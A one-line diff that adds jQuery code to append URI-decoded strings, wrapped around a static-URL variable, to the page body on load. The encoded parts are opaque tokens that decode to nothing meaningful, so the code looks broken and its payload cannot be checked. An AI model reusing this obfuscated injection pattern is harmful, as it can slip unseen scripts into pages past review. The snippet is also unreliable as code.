@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('AVMNEGCX6FAN') + G_STATIC_URL + decodeURIComponent('8XBVWSP1XDYZN49KRX2HO7ICRFL9N')); }); 
